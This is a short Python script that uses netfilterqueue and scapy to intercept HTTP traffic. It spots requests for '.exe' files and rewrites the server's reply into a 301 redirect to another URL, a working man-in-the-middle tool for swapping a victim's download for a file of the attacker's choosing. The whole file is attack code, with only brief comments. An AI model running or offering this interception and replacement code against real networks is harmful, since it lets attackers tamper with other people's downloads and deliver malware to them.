
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80: # HTTP Request
            if '.exe' in str(scapy_packet[scapy.Raw].load):
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80: # HTTP Response
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n")
                packet.set_payload(bytes(modified_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # callback function executed everytime we sniff a packet
queue.run()

